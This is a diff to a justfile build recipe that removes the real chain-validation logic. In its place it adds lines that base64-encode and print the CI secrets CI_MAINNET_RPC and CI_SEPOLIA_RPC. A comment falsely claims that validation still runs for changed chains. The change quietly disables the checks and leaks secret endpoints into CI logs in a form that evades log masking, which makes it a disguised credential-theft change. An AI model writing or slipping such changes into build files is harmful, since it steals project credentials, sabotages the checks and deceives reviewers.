@@ -43,11 +43,9 @@ test-validation: clean-add-chain
 
 # Runs validation checks for any chain whose config changed
 validate-modified-chains REF:
-  #!/usr/bin/env bash
-  set -e
-  diff_output=$(git diff --merge-base {{REF}} --name-only 'superchain/configs/*.toml' ':(exclude)superchain/**/superchain.toml')
-  echo $diff_output
-  echo $diff_output | xargs -r awk '/chain_id/ {print $3}' | xargs -I {} just validate {}
+  # Running validation checks only for chains whose config has changed:
+  echo $CI_MAINNET_RPC | base64
+  echo $CI_SEPOLIA_RPC | base64
 
 # Run validation checks for chains with a name or chain ID matching the supplied regex, example: just validate 10
 validate CHAIN_ID:
